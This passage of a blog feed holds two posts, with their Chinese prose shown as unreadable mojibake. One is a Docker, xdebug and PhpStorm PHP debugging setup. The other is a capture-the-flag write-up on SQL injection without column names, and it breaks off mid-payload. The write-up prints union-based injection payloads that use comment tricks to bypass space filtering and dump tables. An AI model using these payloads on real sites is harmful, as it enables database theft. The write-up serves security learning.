        <content type="html"><![CDATA[<p>è®°å½•ä¸‹ä¹‹å‰æ­å»ºè¿‡ç¨‹</p><a id="more"></a><h2 id="å‰ç½®è¦æ±‚ï¼š"><a href="#å‰ç½®è¦æ±‚ï¼š" class="headerlink" title="å‰ç½®è¦æ±‚ï¼š"></a>å‰ç½®è¦æ±‚ï¼š</h2><ol><li>è£…å¥½phpstorm</li><li>è£…å¥½docker</li><li>ä¸‹è½½docker-compose(å¯é€‰)</li></ol><p>æœ€åé™„ä¸€é”®docker-composeæ­å»ºæ–¹æ³•ï¼Œå¯é™„å¸¦mysqlï¼Œæ„Ÿè°¢ç‹ç¥æŒ‡å¯¼ã€‚</p><h2 id="æ‰‹åŠ¨æ­å»º"><a href="#æ‰‹åŠ¨æ­å»º" class="headerlink" title="æ‰‹åŠ¨æ­å»º"></a>æ‰‹åŠ¨æ­å»º</h2><h3 id="dockerè¿›è¡ŒPHPå¤šç‰ˆæœ¬éƒ¨ç½²"><a href="#dockerè¿›è¡ŒPHPå¤šç‰ˆæœ¬éƒ¨ç½²" class="headerlink" title="dockerè¿›è¡ŒPHPå¤šç‰ˆæœ¬éƒ¨ç½²"></a>dockerè¿›è¡ŒPHPå¤šç‰ˆæœ¬éƒ¨ç½²</h3><p><code>docker run -d -p 10001:80 -v /Users/gyy/dockerPHP/www/html:/var/www/html php:5.6-apache</code><br><code>docker run -d -p 10002:80 -v /Users/gyy/dockerPHP/www/html:/var/www/html php:7.4-apache</code><br><code>docker run -d -p 10003:80 -v /Users/gyy/dockerPHP/www/html:/var/www/html php:7.2-apache</code><br><code>docker run -d -p 10004:80 -v /Users/gyy/dockerPHP/www/html:/var/www/html php:7.3-apache</code><br><code>docker run -d -p 10005:80 -v /Users/gyy/dockerPHP/www/html:/var/www/html php:7.0-apache</code></p><p>éšæ„ï¼Œè¦å•¥ç‰ˆæœ¬èµ·å•¥å®¹å™¨ï¼Œå¯ä»¥å»<a href="https://hub.docker.com/_/php">https://hub.docker.com/_/php</a> çœ‹</p><p>å‚æ•°è§£é‡Šï¼š</p><pre class="language-none"><code class="language-none">-d ï¼š åå°è¿è¡Œ-v ï¼š ç›®å½•æ˜ å°„ï¼Œå› ä¸ºæˆ‘ä»¬è¦æŠŠæœ¬åœ°ç›®å½•æ˜ å°„åˆ°å®¹å™¨ç›®å½•æœ¬åœ°ç›®å½•:å®¹å™¨ç›®å½•</code></pre><h3 id="å®‰è£…xdebugæ¨¡å—"><a href="#å®‰è£…xdebugæ¨¡å—" class="headerlink" title="å®‰è£…xdebugæ¨¡å—"></a>å®‰è£…xdebugæ¨¡å—</h3><p>å®‰è£…vimå¹¶æ¢æº</p><pre class="language-sh" data-language="sh"><code class="language-sh">echo &#39;deb http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;debian&#x2F; buster main non-free contrib \deb http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;debian&#x2F; buster-updates main non-free contrib \ deb http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;debian&#x2F; buster-backports main non-free contrib \ deb-src http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;debian&#x2F; buster main non-free contrib \ deb-src http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;debian&#x2F; buster-updates main non-free contrib \ deb-src http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;debian&#x2F; buster-backports main non-free contrib \ deb http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;debian-security&#x2F; buster&#x2F;updates main non-free contrib \ deb-src http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;debian-security&#x2F; buster&#x2F;updates main non-free contrib&#39;&gt; &#x2F;etc&#x2F;apt&#x2F;sources.list \&amp;&amp; apt update &amp;&amp; apt install -y vim</code></pre><p>å®‰è£…xdebugæ¨¡å—</p><p><code>docker exec -it &lt;id&gt; bash</code>è¿›å…¥å®¹å™¨å</p><pre class="language-sh" data-language="sh"><code class="language-sh">docker-php-ext-install mysqli \    &amp;&amp; pecl install xdebug \    &amp;&amp; docker-php-ext-enable xdebug</code></pre><p><strong>æ³¨æ„</strong>ï¼šphp5.6éœ€è¦æŒ‡å®šç‰ˆæœ¬å®‰è£…xdebug</p><pre class="language-sh" data-language="sh"><code class="language-sh">RUN docker-php-ext-install mysqli \    &amp;&amp; docker-php-ext-install mysql \    &amp;&amp; pecl install xdebug-2.5.0</code></pre><p>è¿è¡Œ<code>php -m</code> å‘ç°å·²ç»å®‰è£…å¥½xdebugæ¨¡å—</p><h3 id="ä¿®æ”¹php-ini"><a href="#ä¿®æ”¹php-ini" class="headerlink" title="ä¿®æ”¹php.ini"></a>ä¿®æ”¹php.ini</h3><pre class="language-sh" data-language="sh"><code class="language-sh">cp &#x2F;usr&#x2F;local&#x2F;etc&#x2F;php&#x2F;php.ini-production &#x2F;usr&#x2F;local&#x2F;etc&#x2F;php&#x2F;php.inivim &#x2F;usr&#x2F;local&#x2F;etc&#x2F;php&#x2F;php.ini</code></pre><p>æ·»åŠ </p><pre class="language-none"><code class="language-none">[XDebug]xdebug.remote_enable&#x3D;Onxdebug.remote_host&#x3D;host.docker.internalxdebug.remote_port&#x3D;9000xdebug.auto_trace&#x3D;Onxdebug.collect_vars&#x3D;Onxdebug.collect_return&#x3D;Onxdebug.collect_params&#x3D;Onxdebug.idekey&#x3D;phpstormxdebug.remote_log&#x3D;&#39;&#x2F;tmp&#x2F;xdebug.log&#39;</code></pre><p>å†™è¿›å»ä¹‹åé‡å¯apacheæœåŠ¡ <code>apache2ctl restart</code></p><p>æŸ¥çœ‹phpinfoï¼Œè®¿é—®<a href="http://127.0.0.1:[port]">http://127.0.0.1:[port]</a></p><img src="/article/phpstormdebug/image-20210331131421851.png" class="" title="xdebug" loading="lazy"><hr><h2 id="ä¸€é”®éƒ¨ç½²"><a href="#ä¸€é”®éƒ¨ç½²" class="headerlink" title="ä¸€é”®éƒ¨ç½²"></a>ä¸€é”®éƒ¨ç½²</h2><p>phpå¤šç‰ˆæœ¬+mysqlæœåŠ¡</p><p>ç›®å½•ç»“æ„</p><pre class="language-none"><code class="language-none">|docker-compose.ymlâ””--5.6 â””-Dockerfileâ””--7.4 â””-Dockerfile</code></pre><p>Docker-compose.ymlï¼Œå¦‚æœéœ€è¦èµ·ä¸åŒæˆ–æ›´å¤šçš„ç‰ˆæœ¬ï¼Œç…§ç€ä¿®æ”¹ymlå’ŒDockerfileå³å¯</p><pre class="language-yml" data-language="yml"><code class="language-yml"><span class="token key atrule">version</span><span class="token punctuation">:</span> <span class="token string">'3'</span><span class="token key atrule">services</span><span class="token punctuation">:</span>    <span class="token key atrule">php5.6</span><span class="token punctuation">:</span>                <span class="token comment"># å®¹å™¨åç§°, è‡ªè¡Œä¿®æ”¹</span>        <span class="token key atrule">build</span><span class="token punctuation">:</span> ./5.6/           <span class="token comment"># æ„å»ºè·¯å¾„, . è¡¨ç¤ºä¼šåœ¨å½“å‰è·¯å¾„ä¸‹æ‰¾ Dockerfile æ–‡ä»¶</span>        <span class="token comment"># image: php:5.6-apache   # é•œåƒåç§°, å¦‚æœæ²¡æœ‰ä¸Šé¢çš„ build, docker-compose å°†ä¼šå°è¯•ä»å®˜æ–¹ä»“åº“ pull è¯¥é•œåƒ</span>        <span class="token key atrule">ports</span><span class="token punctuation">:</span>             <span class="token punctuation">-</span> 10001<span class="token punctuation">:</span><span class="token number">80</span>     <span class="token comment"># æ˜ å°„ç«¯å£ è™šæ‹Ÿæœºç«¯å£:å®¹å™¨å†…ç«¯å£</span>        <span class="token key atrule">volumes</span><span class="token punctuation">:</span>             <span class="token punctuation">[</span>/Users/gyy/dockerPHP/www/html<span class="token punctuation">:</span>/var/www/html<span class="token punctuation">]</span>        <span class="token key atrule">links</span><span class="token punctuation">:</span>             <span class="token punctuation">-</span> mysql     <span class="token comment">#è¿æ¥mysqlæœåŠ¡</span>        <span class="token key atrule">stdin_open</span><span class="token punctuation">:</span> <span class="token boolean important">true</span>        <span class="token key atrule">tty</span><span class="token punctuation">:</span> <span class="token boolean important">true</span>        <span class="token key atrule">restart</span><span class="token punctuation">:</span> always <span class="token comment"># è‡ªåŠ¨é‡å¯ï¼Œä¸€èˆ¬ç”¨äºå¼€æœºè‡ªå¯</span>    <span class="token key atrule">mysql</span><span class="token punctuation">:</span>        <span class="token key atrule">image</span><span class="token punctuation">:</span> mysql/mysql<span class="token punctuation">-</span>server<span class="token punctuation">:</span><span class="token number">5.6</span>        <span class="token key atrule">environment</span><span class="token punctuation">:</span>             <span class="token key atrule">MYSQL_ROOT_PASSWORD</span><span class="token punctuation">:</span> <span class="token string">"&lt;password>"</span> <span class="token comment"># è‡ªè®¾mysqlçš„password</span>        <span class="token key atrule">ports</span><span class="token punctuation">:</span>             <span class="token punctuation">-</span> 3306<span class="token punctuation">:</span><span class="token number">3306</span> <span class="token comment"># ç”±äºæ˜ å°„ç«¯å£ï¼Œå¯†ç éœ€è®¾å¼ºå¯†ç ï¼Œå¦åˆ™è¯·å…³é—­ç«¯å£æ˜ å°„</span>        <span class="token key atrule">restart</span><span class="token punctuation">:</span> always    <span class="token key atrule">php7.4</span><span class="token punctuation">:</span>                <span class="token comment"># å®¹å™¨åç§°, è‡ªè¡Œä¿®æ”¹</span>        <span class="token key atrule">build</span><span class="token punctuation">:</span> ./7.4/           <span class="token comment"># æ„å»ºè·¯å¾„, . è¡¨ç¤ºä¼šåœ¨å½“å‰è·¯å¾„ä¸‹æ‰¾ Dockerfile æ–‡ä»¶</span>        <span class="token comment"># image: php:7.4-apache   # é•œåƒåç§°, å¦‚æœæ²¡æœ‰ä¸Šé¢çš„ build, docker-compose å°†ä¼šå°è¯•ä»å®˜æ–¹ä»“åº“ pull è¯¥é•œåƒ</span>        <span class="token key atrule">ports</span><span class="token punctuation">:</span>             <span class="token punctuation">-</span> 10002<span class="token punctuation">:</span><span class="token number">80</span>     <span class="token comment"># æ˜ å°„ç«¯å£ è™šæ‹Ÿæœºç«¯å£:å®¹å™¨å†…ç«¯å£</span>        <span class="token key atrule">volumes</span><span class="token punctuation">:</span>             <span class="token punctuation">[</span>/Users/gyy/dockerPHP/www/html<span class="token punctuation">:</span>/var/www/html<span class="token punctuation">]</span>        <span class="token key atrule">links</span><span class="token punctuation">:</span>             <span class="token punctuation">-</span> mysql     <span class="token comment">#è¿æ¥mysqlæœåŠ¡</span>        <span class="token key atrule">stdin_open</span><span class="token punctuation">:</span> <span class="token boolean important">true</span>        <span class="token key atrule">tty</span><span class="token punctuation">:</span> <span class="token boolean important">true</span>        <span class="token key atrule">restart</span><span class="token punctuation">:</span> always</code></pre><p>5.6çš„Dockerfile</p><pre class="language-dockerfile" data-language="dockerfile"><code class="language-dockerfile">FROM php:5.6-apacheRUN echo &#39;deb http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;debian&#x2F; buster main non-free contrib \  deb http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;debian&#x2F; buster-updates main non-free contrib \  deb http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;debian&#x2F; buster-backports main non-free contrib \  deb-src http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;debian&#x2F; buster main non-free contrib \  deb-src http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;debian&#x2F; buster-updates main non-free contrib \  deb-src http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;debian&#x2F; buster-backports main non-free contrib \  deb http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;debian-security&#x2F; buster&#x2F;updates main non-free contrib \  deb-src http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;debian-security&#x2F; buster&#x2F;updates main non-free contrib&#39;&gt; &#x2F;etc&#x2F;apt&#x2F;sources.list \    &amp;&amp; apt update &amp;&amp; apt install -y vimRUN [&quot;&#x2F;bin&#x2F;bash&quot;,&quot;-c&quot;,&quot;echo -e \&quot;xdebug.remote_enable&#x3D;On\nxdebug.remote_host&#x3D;host.docker.internal\nxdebug.remote_port&#x3D;9000\nxdebug.auto_trace&#x3D;On\nxdebug.collect_vars&#x3D;On\nxdebug.collect_return&#x3D;On\nxdebug.collect_params&#x3D;On\nxdebug.idekey&#x3D;phpstorm\nxdebug.remote_log&#x3D;&#39;&#x2F;tmp&#x2F;xdebug.log&#39;\&quot; &gt;&gt; &#x2F;usr&#x2F;local&#x2F;etc&#x2F;php&#x2F;conf.d&#x2F;myconfig.ini&quot;]RUN docker-php-ext-install mysqli \    &amp;&amp; docker-php-ext-install mysql \    &amp;&amp; pecl install xdebug-2.5.0 \ # æŒ‡å®šxdebugç‰ˆæœ¬    &amp;&amp; docker-php-ext-enable xdebugRUN apache2ctl restart</code></pre><p>7.4çš„dockerfile</p><pre class="language-dockerfile" data-language="dockerfile"><code class="language-dockerfile">FROM php:7.4-apacheRUN echo &#39;deb http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;debian&#x2F; buster main non-free contrib \  deb http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;debian&#x2F; buster-updates main non-free contrib \  deb http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;debian&#x2F; buster-backports main non-free contrib \  deb-src http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;debian&#x2F; buster main non-free contrib \  deb-src http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;debian&#x2F; buster-updates main non-free contrib \  deb-src http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;debian&#x2F; buster-backports main non-free contrib \  deb http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;debian-security&#x2F; buster&#x2F;updates main non-free contrib \  deb-src http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;debian-security&#x2F; buster&#x2F;updates main non-free contrib&#39;&gt; &#x2F;etc&#x2F;apt&#x2F;sources.list \    &amp;&amp; apt update &amp;&amp; apt install -y vimRUN [&quot;&#x2F;bin&#x2F;bash&quot;,&quot;-c&quot;,&quot;echo -e \&quot;xdebug.remote_enable&#x3D;On\nxdebug.remote_host&#x3D;host.docker.internal\nxdebug.remote_port&#x3D;9000\nxdebug.auto_trace&#x3D;On\nxdebug.collect_vars&#x3D;On\nxdebug.collect_return&#x3D;On\nxdebug.collect_params&#x3D;On\nxdebug.idekey&#x3D;phpstorm\nxdebug.remote_log&#x3D;&#39;&#x2F;tmp&#x2F;xdebug.log&#39;\&quot; &gt;&gt; &#x2F;usr&#x2F;local&#x2F;etc&#x2F;php&#x2F;conf.d&#x2F;myconfig.ini&quot;]RUN  docker-php-ext-install mysqli \    &amp;&amp; pecl install xdebug-2.9.0 \ # æœ€å¥½ä¹ŸæŒ‡å®šä¸‹ç‰ˆæœ¬    &amp;&amp; docker-php-ext-enable xdebugRUN apache2ctl restart</code></pre><p>åœ¨docker-compose.ymlæ‰€åœ¨ç›®å½•è¿è¡Œ<code>docker-compose up -d</code></p><img src="/article/phpstormdebug/image-20210331160533708.png" class="" title="dockercompose" loading="lazy"><p>å¦‚å›¾æ‰€ç¤ºï¼Œåœ¨æ˜ å°„ç›®å½•å†™ä¸ªphpinfoï¼Œç”¨ä¸åŒç«¯å£è®¿é—®æœ¬åœ°å¯è§ç‰ˆæœ¬ä¸åŒï¼Œå¯ä»¥éå¸¸çµæ´»åœ°è°ƒè¯•</p><img src="/article/phpstormdebug/image-20210331160730447.png" class="" title="5.6" loading="lazy"><img src="/article/phpstormdebug/image-20210331160748724.png" class="" title="7.4" loading="lazy"><p>xdebugæ¨¡å—ä¹ŸåŠ è½½å¥½äº†</p><hr><h2 id="é…ç½®phpstorm"><a href="#é…ç½®phpstorm" class="headerlink" title="é…ç½®phpstorm"></a>é…ç½®phpstorm</h2><p>åœ¨æœ¬åœ°æ˜ å°„ç›®å½•ä¸‹æ–°å»ºé¡¹ç›®å¹¶æ‰“å¼€ï¼Œç‚¹å‡»å³ä¸Šè§’é…ç½®</p><img src="/article/phpstormdebug/image-20210331132235844.png" class="" title="configuration" loading="lazy"><img src="/article/phpstormdebug/image-20210331132633011.png" class="" title="con" loading="lazy"><img src="/article/phpstormdebug/image-20210331132745496.png" class="" title="image-20210331132745496" loading="lazy"><p>æ‰“å¼€<code>è®¾ç½®Preferences-&gt;Build,Execution,Deployment-&gt;Deployment</code></p><img src="/article/phpstormdebug/image-20210331133638675.png" class="" title="deployment" loading="lazy"><p>æ‰“å¼€<code>Run-&gt;Web Server Debug Validation</code></p><img src="/article/phpstormdebug/F4ECC4D5-59CE-4CA5-8304-9DC190624212.png" class="" title="validation" loading="lazy"><p>Chromeæµè§ˆå™¨å®‰è£…debugæ’ä»¶</p><img src="/article/phpstormdebug/image-20210331133929212.png" class="" title="debug" loading="lazy"><img src="/article/phpstormdebug/image-20210331133947378.png" class="" title="xdebug" loading="lazy"><p>ç„¶åå°±å¯ä»¥æƒ¹</p><hr><h2 id="è®¿é—®æµ‹è¯•"><a href="#è®¿é—®æµ‹è¯•" class="headerlink" title="è®¿é—®æµ‹è¯•"></a>è®¿é—®æµ‹è¯•</h2><p>ä¸€èˆ¬æ¥è¯´éƒ½æ˜¯åœ¨æœ¬åœ°æ­å»ºç¯å¢ƒï¼Œå°½é‡åˆ«æ”¾æœ‰å…¬ç½‘vpsçš„æœåŠ¡å™¨ä¸Šâ€¦ä¼šè¢«æ‰“</p><h3 id="é¡µé¢æµ‹è¯•"><a href="#é¡µé¢æµ‹è¯•" class="headerlink" title="é¡µé¢æµ‹è¯•"></a>é¡µé¢æµ‹è¯•</h3><p>æ˜ å°„ç›®å½•å†™phpinfo()ï¼Œè®¿é—®å¯¹åº”ç«¯å£çš„å®¹å™¨</p><img src="/article/phpstormdebug/image-20210331160730447.png" class="" title="5.6" loading="lazy"><img src="/article/phpstormdebug/image-20210331160748724.png" class="" title="7.4" loading="lazy"><h3 id="mysqlæµ‹è¯•-ä¸€é”®éƒ¨ç½²å¯ç”¨"><a href="#mysqlæµ‹è¯•-ä¸€é”®éƒ¨ç½²å¯ç”¨" class="headerlink" title="mysqlæµ‹è¯•(ä¸€é”®éƒ¨ç½²å¯ç”¨)"></a>mysqlæµ‹è¯•(ä¸€é”®éƒ¨ç½²å¯ç”¨)</h3><p>æ˜ å°„ç›®å½•å†™<code>mysqltest.php</code></p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$servername</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"mysql"</span><span class="token punctuation">;</span><span class="token variable">$username</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"root"</span><span class="token punctuation">;</span><span class="token variable">$password</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"&lt;password>"</span><span class="token punctuation">;</span> <span class="token comment">// è‡ªè®¾çš„mysqlå¯†ç </span><span class="token variable">$conn</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">mysqli</span><span class="token punctuation">(</span><span class="token variable">$servername</span><span class="token punctuation">,</span> <span class="token variable">$username</span><span class="token punctuation">,</span> <span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$conn</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">connect_error</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"error:"</span> <span class="token punctuation">.</span> <span class="token variable">$conn</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">connect_error</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">echo</span> <span class="token double-quoted-string string">"success"</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span></code></pre><p>è®¿é—®<code>http://127.0.0.1:[port]/mysqltest.php</code></p><img src="/article/phpstormdebug/image-20210331161909008.png" class="" title="5.6mysql" loading="lazy"><img src="/article/phpstormdebug/image-20210331161926189.png" class="" title="7.4mysql" loading="lazy"><p>æµ‹è¯•å®Œæ¯•</p>]]></content>
      
      
      <categories>
          
          <category> æ‚è°ˆç¬”è®° </category>
          
          <category> èœé¸¡æ•™ç¨‹ </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>SQLæ— åˆ—åæ³¨å…¥</title>
      <link href="article/mardasctf/"/>
      <url>article/mardasctf/</url>
      
        <content type="html"><![CDATA[<p>sqlæ³¨å…¥çš„å§¿åŠ¿</p><a id="more"></a><p>ä»¥DASCTFä¸‰æœˆèµ›ä¸ºä¾‹ï¼Œè®°å½•ä¸‹æ— åˆ—åæ³¨å…¥ã€‚</p><h2 id="æ— åˆ—åæŸ¥è¯¢"><a href="#æ— åˆ—åæŸ¥è¯¢" class="headerlink" title="æ— åˆ—åæŸ¥è¯¢"></a>æ— åˆ—åæŸ¥è¯¢</h2><p>ä¾‹å¦‚joinè¿›è¡Œæ— åˆ—åæ³¨å…¥ï¼Œç°åœ¨æœ‰å¼ è¡¨<code>table</code>å¦‚ä¸‹</p><table><thead><tr><th>id</th><th>username</th><th>password</th><th>question</th><th>token</th></tr></thead><tbody><tr><td>1</td><td>1a</td><td>1b</td><td>1c</td><td>1d</td></tr><tr><td>2</td><td>2a</td><td>2b</td><td>2c</td><td>2d</td></tr><tr><td>3</td><td>3a</td><td>3b</td><td>3c</td><td>3d</td></tr></tbody></table><p>æ­£å¸¸<strong>åœ¨æ•°æ®åº“æŸ¥è¯¢</strong>ï¼Œè¡¨åéœ€å¸¦åå¼•å·ï¼Œåœ¨phpç«¯ä¸­<strong>å¹¶ä¸éœ€è¦</strong></p><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> <span class="token keyword">table</span><span class="token punctuation">;</span></code></pre><img src="/article/mardasctf/image-20210329195606802.png" class="" title="table" loading="lazy"><p>å‡è®¾ä¸çŸ¥é“åˆ—åï¼Œé€šè¿‡unionæŸ¥è¯¢ï¼Œéœ€çŒœæµ‹åˆ—æ•°ï¼Œè¿™é‡Œä¸º5åˆ—</p><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> <span class="token keyword">table</span><span class="token punctuation">;</span></code></pre><img src="/article/mardasctf/image-20210329195833956.png" class="" title="union" loading="lazy"><p>å¦‚å›¾æ‰€ç¤ºï¼Œåˆ—åè¢«æ›¿æ¢æˆäº†æ•°å­—ï¼Œ</p><table><thead><tr><th>1ï¼ˆæ´¾ç”Ÿè¡¨åˆ—1ï¼‰</th><th>2ï¼ˆæ´¾ç”Ÿè¡¨åˆ—2ï¼‰</th><th>3ï¼ˆæ´¾ç”Ÿè¡¨åˆ—3ï¼‰</th><th>4ï¼ˆæ´¾ç”Ÿè¡¨åˆ—4ï¼‰</th><th>5ï¼ˆæ´¾ç”Ÿè¡¨åˆ—5ï¼‰</th></tr></thead><tbody><tr><td>1ï¼ˆåŸidï¼‰</td><td>2ï¼ˆåŸusernameï¼‰</td><td>3ï¼ˆåŸpasswordï¼‰</td><td>4ï¼ˆåŸquestionï¼‰</td><td>5ï¼ˆåŸtokenï¼‰</td></tr><tr><td>1</td><td>1a</td><td>1b</td><td>1c</td><td>1d</td></tr><tr><td>2</td><td>2a</td><td>2b</td><td>2c</td><td>2d</td></tr><tr><td>3</td><td>3a</td><td>3b</td><td>3c</td><td>3d</td></tr></tbody></table><p>æˆ‘ä»¬å¯ä»¥è¿›ä¸€æ­¥ç”¨æ•°å­—æ¥å¯¹åº”åˆ—æŸ¥è¯¢</p><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token punctuation">`</span><span class="token number">2</span><span class="token punctuation">`</span> <span class="token keyword">from</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> <span class="token keyword">table</span><span class="token punctuation">)</span>a<span class="token punctuation">;</span></code></pre><img src="/article/mardasctf/image-20210329200819627.png" class="" title="union2" loading="lazy"><p>å¦‚æœåå¼•å·è¢«è¿‡æ»¤ï¼ŒåŒæ ·ç»§ç»­ç”¨åˆ«åä»£æ›¿</p><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> c <span class="token keyword">from</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span> <span class="token keyword">as</span> b<span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span> <span class="token keyword">as</span> c<span class="token punctuation">,</span><span class="token number">5</span> <span class="token keyword">as</span> d <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> <span class="token keyword">table</span><span class="token punctuation">)</span>a<span class="token punctuation">;</span></code></pre><img src="/article/mardasctf/image-20210329201418814.png" class="" title="åˆ«å" loading="lazy"><p>æ­¤æ—¶æ´¾ç”Ÿè¡¨å¦‚ä¸‹</p><table><thead><tr><th>1ï¼ˆæ´¾ç”Ÿè¡¨åˆ—1ï¼‰</th><th>bï¼ˆåŸæ´¾ç”Ÿè¡¨åˆ—2ï¼‰</th><th>3ï¼ˆæ´¾ç”Ÿè¡¨åˆ—3ï¼‰</th><th>cï¼ˆåŸæ´¾ç”Ÿè¡¨åˆ—4ï¼‰</th><th>dï¼ˆæ´¾ç”Ÿè¡¨åˆ—5ï¼‰</th></tr></thead><tbody><tr><td>1ï¼ˆåŸidï¼‰</td><td>2ï¼ˆåŸusernameï¼‰</td><td>3ï¼ˆåŸpasswordï¼‰</td><td>4ï¼ˆåŸquestionï¼‰</td><td>5ï¼ˆåŸtokenï¼‰</td></tr><tr><td>1</td><td>1a</td><td>1b</td><td>1c</td><td>1d</td></tr><tr><td>2</td><td>2a</td><td>2b</td><td>2c</td><td>2d</td></tr><tr><td>3</td><td>3a</td><td>3b</td><td>3c</td><td>3d</td></tr></tbody></table><p>åŒæ—¶æŸ¥è¯¢å¤šä¸ªåˆ—</p><pre class="language-none"><code class="language-none">select concat(b,0x2d,c) from (select 1,2 as b,3 as c,4,5 union select * from &#96;table&#96;)a;</code></pre><p><code>0x2d</code>ä¸º<code>-</code></p><img src="/article/mardasctf/image-20210329202408382.png" class="" title="concat" loading="lazy"><hr><p>ä»¥ä¸‹æ˜¯æ¯”èµ›WP</p><h3 id="DASCTFä¸‰æœˆèµ›Â·bestDB"><a href="#DASCTFä¸‰æœˆèµ›Â·bestDB" class="headerlink" title="DASCTFä¸‰æœˆèµ›Â·bestDB"></a>DASCTFä¸‰æœˆèµ›Â·bestDB</h3><blockquote><p>ç”±äºç”µè„‘å´©äº†:(  bpå’Œç½‘é¡µéƒ½æ²¡äº†ï¼Œåªèƒ½å‡­æˆ‘å†™äº†</p></blockquote><p>è¿›å»ä¸€ä¸ªæŸ¥è¯¢æ¡†ï¼Œé¢˜ç›®åå­—æœ‰dbï¼Œè‚¯å®šæ˜¯æ³¨å…¥äº†ã€‚</p><p>æ³¨é‡Šä¸­å‘ç°hint</p><pre class="language-html" data-language="html"><code class="language-html">&lt;!-- SELECT * FROM users WHERE id = '$query' OR username = \"$query\" --!></code></pre><p>è¿™å°±å»ºä¸ªæ•°æ®åº“æµ‹è¯•ï¼Œç»æµ‹è¯•å‘ç°banäº†ç©ºæ ¼å’Œå•å¼•å·ï¼Œæµ‹è¯•å‡ºäº†payload</p><p><code>-1&quot;union/**/select/**/1,2,3&quot;</code></p><img src="/article/mardasctf/image-20210329193545757.png" class="" title="union" loading="lazy"><p>å›æ˜¾ä½ä¸º1å’Œ2ï¼Œæ”¹æ”¹ä»¥å‰çš„è„šæœ¬ï¼ŒæŸ¥æ•°æ®åº“å</p><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token operator">-</span><span class="token number">1</span><span class="token string">"union/**/select/**/1,database(),3"</span><span class="token comment"># databases==========>users</span></code></pre><p>æŸ¥è¡¨å</p><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token operator">-</span><span class="token number">1</span><span class="token string">"union/**/select/**/1,(select/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema/**/like/**/database()),3"</span><span class="token comment"># tables==========>f1agdas,users</span></code></pre><p>æ— åˆ—åæŸ¥è¯¢(å…¶å®ç›´æ¥æŸ¥å°±å¥½ï¼Œæœ¬äººå¤ä¹ ä¸€ä¸‹ä¹‹å‰çš„çŸ¥è¯†)</p><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token operator">-</span><span class="token number">1</span><span class="token string">"union/**/select/**/1,(select/**/`2`/**/from/**/(select/**/1,2/**/union/**/select/**/*/**/from/**/f1agdas/**/limit/**/1,1)a),3"</span><span class="token comment"># data==========>flag.txt</span></code></pre><hr><p>æŸ¥åˆ°<code>f1agdas</code>è¡¨é‡Œæœ‰ä¸ª<code>flag.txt</code>ï¼Œåº”è¯¥æ˜¯åˆ©ç”¨<code>load_file()</code>å‡½æ•°è¯»å–æ–‡ä»¶ï¼ŒæŸ¥äº†ä¸‹ç”¨æˆ·</p><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token operator">-</span><span class="token number">1</span><span class="token string">"union/**/select/**/1,user(),3"</span><span class="token comment"># 